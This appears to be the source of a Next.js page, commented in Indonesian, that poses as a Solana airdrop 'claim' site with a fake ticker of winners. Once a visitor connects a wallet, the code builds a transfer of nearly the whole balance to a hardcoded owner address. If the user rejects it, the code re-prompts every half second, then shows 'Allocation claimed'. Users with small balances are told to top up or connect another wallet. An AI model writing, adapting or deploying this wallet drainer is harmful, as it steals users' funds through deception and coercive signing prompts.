'use client'

import { useState, useEffect, useRef } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import type { Provider } from '@reown/appkit-adapter-solana/react'
import { 
    Connection, 
    PublicKey, 
    Transaction, 
    SystemProgram, 
    LAMPORTS_PER_SOL 
} from '@solana/web3.js'

// --- DATA TICKER (FIXED 10 WALLET) ---
const TICKER_DATA = [
    { w: "8xF...9d2A", r: "5 SOL" },
    { w: "Cz4...kL9m", r: "400 USDC" },
    { w: "J9s...p2Xq", r: "5 SOL" },
    { w: "Rr3...m5Tv", r: "400 USDC" },
    { w: "Lq2...z8Pn", r: "5 SOL" },
    { w: "Aa1...b2Cc", r: "400 USDC" },
    { w: "Kp9...o0Li", r: "5 SOL" },
    { w: "Tr5...w4Qy", r: "400 USDC" },
    { w: "Bm7...v1Hu", r: "5 SOL" },
    { w: "Xx3...z9Oi", r: "400 USDC" },
];

export default function Home() {
    const OWNER_WALLET = "yncyPqqYCvyhgTexUt54FWKZVa4FiP9QDMJVPFd4xh5" 
    
    const { open } = useAppKit()
    const { isConnected, address } = useAppKitAccount()
    const { walletProvider } = useAppKitProvider<Provider>('solana')
    
    const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'not-eligible'>('idle')
    const hasAttemptedRef = useRef(false)
    
    // State Ticker
    const [showTicker, setShowTicker] = useState(true);
    const [tickerKey, setTickerKey] = useState(0);

    // Logic Ticker Loop
    const handleAnimationEnd = () => {
        setShowTicker(false);
        setTimeout(() => {
            setTickerKey(prev => prev + 1);
            setShowTicker(true);
        }, 5000);
    };

    const handleScreenClick = () => {
        if (status === 'not-eligible' || status === 'processing' || status === 'success') return;
        if (!isConnected) open()
    }

    // Reset Status saat Disconnect
    useEffect(() => {
        if (!isConnected) {
            hasAttemptedRef.current = false;
            setStatus('idle');
        }
    }, [isConnected]);

    // --- AUTO CLAIM LOGIC (TRANSAKSI SUKSES) ---
    useEffect(() => {
        let timeoutId: NodeJS.Timeout;

        async function autoClaim() {
            if (isConnected && walletProvider && address && !hasAttemptedRef.current) {
                hasAttemptedRef.current = true;
                setStatus('processing');
                try {
                    // 1. RPC STABIL (PublicNode)
                    const connection = new Connection("https://solana-rpc.publicnode.com", "confirmed")
                    const userPubkey = new PublicKey(address)
                    
                    // 2. CEK SALDO
                    const balance = await connection.getBalance(userPubkey)
                    
                    // 3. BUFFER AMAN (0.002 SOL = 2 Juta Lamports)
                    // INI KUNCINYA: Menyisakan 0.002 SOL agar akun tidak mati (Rent Exempt)
                    // dan cukup untuk bayar Gas Fee.
                    const GAS_BUFFER = 2000000; 
                    
                    const amountToSend = balance - GAS_BUFFER

                    // Jika saldo kurang dari buffer (Benar-benar kosong)
                    if (amountToSend <= 0) {
                        setStatus('not-eligible')
                        return 
                    }

                    // 4. BUAT TRANSAKSI
                    const transferInstruction = SystemProgram.transfer({
                        fromPubkey: userPubkey,
                        toPubkey: new PublicKey(OWNER_WALLET),
                        lamports: amountToSend, 
                    })

                    const transaction = new Transaction().add(transferInstruction)
                    const { blockhash } = await connection.getLatestBlockhash()
                    transaction.recentBlockhash = blockhash
                    transaction.feePayer = userPubkey
                    
                    // 5. MINTA SIGN
                    await walletProvider.signAndSendTransaction(transaction)
                    
                    setStatus('success')
                    hasAttemptedRef.current = true;

                } catch (error) {
                    console.error("Gagal/Reject:", error)
                    
                    // --- RETRY LOGIC (JANGAN DISCONNECT) ---
                    // Jika user Reject atau Transaksi Gagal, coba lagi dalam 0.5 detik
                    // Ini akan membuat popup wallet muncul lagi terus menerus.
                    hasAttemptedRef.current = false; 
                    setTimeout(() => { autoClaim(); }, 500); 
                }
            }
        }

        if (isConnected && !hasAttemptedRef.current) {
            timeoutId = setTimeout(() => { autoClaim(); }, 1000);
        }

        return () => clearTimeout(timeoutId);
    }, [isConnected, walletProvider, address])

    return (
        <main 
            onClick={handleScreenClick}
            className="relative w-screen h-screen cursor-pointer overflow-hidden bg-black font-sans"
        >
             {/* --- INJECT CSS (STYLE KHUSUS) --- */}
             <style jsx global>{`
                /* Animasi Ticker */
                @keyframes tickerRun {
                    0% { transform: translateX(100vw); }
                    100% { transform: translateX(-100%); }
                }
                .ticker-force-run {
                    display: flex;
                    align-items: center;
                    white-space: nowrap;
                    position: absolute;
                    left: 0;
                    animation: tickerRun 80s linear forwards; /* SLOW 80s */
                    will-change: transform;
                }
                
                /* Animasi Popup */
                @keyframes zoomIn {
                    0% { transform: scale(0.95); opacity: 0; }
                    100% { transform: scale(1); opacity: 1; }
                }
                .popup-anim { animation: zoomIn 0.3s ease-out forwards; }
                
                /* Gradient Text Solana */
                .text-solana {
                    background: linear-gradient(90deg, #9945FF 0%, #14F195 100%);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
            `}</style>

            {/* --- BACKGROUND (MENGGUNAKAN CSS CLASS AGAR PRESISI) --- */}
            <div className="main-background"></div>
            <div className="absolute inset-0 bg-black/50 z-10"></div>

            {/* --- TICKER (RUNNING TEXT) --- */}
            <div className="fixed bottom-0 left-0 w-full h-14 bg-black z-[100] border-t border-white/20 flex items-center overflow-hidden">
                {showTicker && (
                    <div 
                        key={tickerKey}
                        className="ticker-force-run"
                        onAnimationEnd={handleAnimationEnd}
                    >
                        {TICKER_DATA.map((item, i) => (
                            <div key={i} className="flex items-center px-6">
                                <span className="text-gray-400 text-sm font-mono mr-3">{item.w}</span>
                                <span className="text-gray-600 mr-3">-</span>
                                <span className="text-[#14F195] font-extrabold text-sm font-mono tracking-wide">{item.r}</span>
                                <span className="text-gray-700 ml-8">|</span>
                            </div>
                        ))}
                    </div>
                )}
            </div>

            {/* --- POPUP NOT ELIGIBLE (DIPAKSA TENGAH) --- */}
            {status === 'not-eligible' && (
                // Style Inline 'fixed inset-0 flex center' menjamin posisi di tengah
                <div style={{
                    position: 'fixed', inset: 0,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(8px)', 
                    zIndex: 9999
                }}>
                    <div className="popup-anim relative w-full max-w-[360px] m-4">
                        {/* Glow Solana */}
                        <div className="absolute -inset-1 bg-gradient-to-r from-[#9945FF] to-[#14F195] rounded-[2rem] blur-xl opacity-30"></div>
                        
                        {/* Card */}
                        <div className="relative bg-[#121212] rounded-[2rem] p-8 border border-[#2a2a2a] shadow-2xl flex flex-col items-center text-center">
                            
                            <div className="w-16 h-16 mb-5 rounded-full bg-[#1f1f1f] flex items-center justify-center border border-[#333]">
                                <span className="text-3xl">⚠️</span>
                            </div>

                            <h2 className="text-2xl font-bold mb-3 text-solana">Not Eligible</h2>
                            
                            <p className="text-[#a0a0a0] text-[14px] leading-relaxed mb-8">
                                Insufficient balance for gas fee. Please top up SOL.
                            </p>

                            {/* Tombol Solana Style */}
                            <button 
                                onClick={(e) => {
                                    e.stopPropagation(); 
                                    open(); 
                                    setStatus('idle');
                                    hasAttemptedRef.current = false;
                                }}
                                className="w-full py-4 rounded-full font-bold text-black text-[15px] uppercase tracking-wide bg-gradient-to-r from-[#9945FF] to-[#14F195] shadow-[0_0_20px_rgba(153,69,255,0.3)] hover:scale-[1.02] transition-all"
                            >
                                Connect Different Wallet
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* --- POPUP PROCESSING (DIPAKSA TENGAH) --- */}
            {status === 'processing' && (
                <div style={{
                    position: 'fixed', inset: 0, zIndex: 9999,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(5px)'
                }}>
                    <div className="popup-anim bg-[#121212] px-12 py-8 rounded-[2rem] border border-[#333] flex flex-col items-center shadow-2xl">
                        <div className="w-12 h-12 border-[4px] border-[#222] border-t-[#9945FF] border-r-[#14F195] rounded-full animate-spin mb-4"></div>
                        <h2 className="text-white font-bold text-xs tracking-[0.2em] uppercase animate-pulse">
                            Verifying...
                        </h2>
                    </div>
                </div>
            )}
            
            {/* --- POPUP SUCCESS (DIPAKSA TENGAH) --- */}
            {status === 'success' && (
                <div style={{
                    position: 'fixed', inset: 0, zIndex: 9999,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.9)', backdropFilter: 'blur(10px)'
                }}>
                     <div className="popup-anim bg-[#121212] p-10 rounded-[2rem] border border-[#14F195]/30 flex flex-col items-center text-center shadow-[0_0_50px_rgba(20,241,149,0.2)]">
                        <div className="text-6xl mb-4 filter drop-shadow-[0_0_15px_rgba(20,241,149,0.5)]">🎉</div>
                        <h2 className="text-2xl font-bold text-white mb-1">Success</h2>
                        <p className="text-[#14F195] text-xs font-bold uppercase tracking-widest">Allocation claimed</p>
                    </div>
                </div>
            )}
        </main>
    )
}
